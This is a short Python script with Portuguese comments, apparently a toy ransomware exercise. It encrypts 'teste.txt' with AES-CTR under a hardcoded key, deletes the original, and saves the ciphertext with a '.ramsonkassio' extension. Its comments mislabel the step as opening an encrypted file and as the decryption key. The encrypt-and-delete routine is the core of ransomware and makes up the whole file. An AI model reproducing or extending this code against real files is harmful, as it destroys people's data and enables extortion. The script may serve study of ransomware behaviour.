import os
import pyaes

# Abrir o arquivo encriptado

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Chave de descriptografia

key = b'cassiotellestest'
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

os.remove(file_name)

new_file = file_name + '.ramsonkassio'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
